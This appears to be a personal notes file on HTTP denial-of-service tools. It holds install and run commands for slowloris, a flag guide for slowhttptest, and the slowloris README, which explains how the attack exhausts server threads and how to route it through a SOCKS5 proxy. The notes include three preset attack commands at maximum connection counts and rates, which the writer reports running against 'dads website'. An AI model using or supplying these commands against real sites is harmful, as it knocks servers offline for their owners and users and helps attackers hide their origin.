# INSTALL 1
https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py example.com

# INSTALL 2

sudo pip3 install slowloris
slowloris example.com


# Tools and commands to use slowhttptest

so basically you will need to type this for everything you want to do

slowhttptest -(enter the test type you want) -u (enter the http:// address you
want to test)

this test will use the default of a slow loris attack aka it loads the header
info super slow.

If you want to use more commands these are the basics

\-H slow loris (Header file)

\-B slow body attack

\-R range attack aka apache killer

\-X slow reader

\-c the amount of connections, in this app the default is 50 and max is 65539

\-u the url address you want to stress test

\-r the rate at which connections are opened

\-l the amount of seconds the stress test will take place

\-k the amount of times the port is able to request back for the same info

Here are some shortcuts that I have pre designed

Slow read attack, attacks dads website, max amount of ports, length of ten
minutes, opens 600 ports a second. Seems to have very very minimal closed ports
on dads website.

slowhttptest -X -u http://website.com -c 65539 -l 600 -r 600

Body Attack, same as above but large amounts of ports lost even with the
increase in ports per second

slowhttptest -B -u http://website.com -c 65539 -l 600 -r 600

Header attack, minimal port loss but still not as good as slow reader

slowhttptest -H -u http://website -c 65539 -l 600 -r 600



# README.md

# slowloris.py - Simple slowloris in Python

## What is Slowloris?
Slowloris is basically an HTTP Denial of Service attack that affects threaded servers. It works like this:

1. We start making lots of HTTP requests.
2. We send headers periodically (every ~15 seconds) to keep the connections open.
3. We never close the connection unless the server does so. If the server closes a connection, we create a new one keep doing the same thing.

This exhausts the servers thread pool and the server can't reply to other people.

## How to install and run?

You can clone the git repo or install using **pip**. Here's how you run it.

* `sudo pip3 install slowloris`
* `slowloris example.com`

That's all it takes to install and run slowloris.py.

If you want to clone using git instead of pip, here's how you do it.

* `git clone https://github.com/gkbrk/slowloris.git`
* `cd slowloris`
* `python3 slowloris.py example.com`

### SOCKS5 proxy support

However, if you plan on using the `-x` option in order to use a SOCKS5 proxy for connecting instead of a direct connection over your IP address, you will need to install the `PySocks` library (or any other implementation of the `socks` library) as well. [`PySocks`](https://github.com/Anorov/PySocks) is a fork from [`SocksiPy`](http://socksipy.sourceforge.net/) by GitHub user @Anorov and can easily be installed by adding `PySocks` to the `pip` command above or running it again like so:

* `sudo pip3 install PySocks`

You can then use the `-x` option to activate SOCKS5 support and the `--proxy-host` and `--proxy-port` option to specify the SOCKS5 proxy host and its port, if they are different from the standard `127.0.0.1:8080`.

## Configuration options
It is possible to modify the behaviour of slowloris with command-line arguments.

## License
The code is licensed under the MIT License.
